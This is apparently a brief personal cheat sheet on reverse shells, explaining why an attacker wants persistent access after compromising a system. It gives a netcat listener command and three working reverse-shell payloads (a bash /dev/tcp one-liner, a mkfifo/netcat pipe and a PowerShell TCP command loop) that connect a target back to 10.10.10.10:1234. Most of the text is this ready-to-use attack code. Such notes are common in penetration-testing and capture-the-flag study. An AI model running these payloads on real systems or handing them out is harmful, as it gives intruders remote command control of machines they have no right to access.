# Why get a shell?

Once you have a system comprised, you dont want to have to configureand execute the same exploit to return to the system. Using networking protocols like ssh for Linux or WinRm for windows can get you a command line interface for an ip, but you will need credentials for that. Finding a service running on a system that is vunerable to opening shells can leave the attacker with a convenient point of entry back the to target.


# Reverse Shell
If you find a system that us vulnerable to remote code execution, you execute commands on the target machine to connect back to your machine. On your machine you use netcat to listen on a port, then on the target machine you execute a payload for a windows shell or linux shell

Commands to run on your machine:

``` bash 

nc -lvnp <port-number> 
```

-l stands for listen, v is for verbose so netcat will print outpur updating us on the state of the connection, n blocks DNS resolution so our machine doesnt try to connect to a DNS server and translate the incoming ip to a domain name and waste time, and p allows you to specify a port.

payloads to run on target machine:

lunix shells:
``` bash

	bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

or

``` bash
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

```

	windows shell:

``` powershell

	powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

```


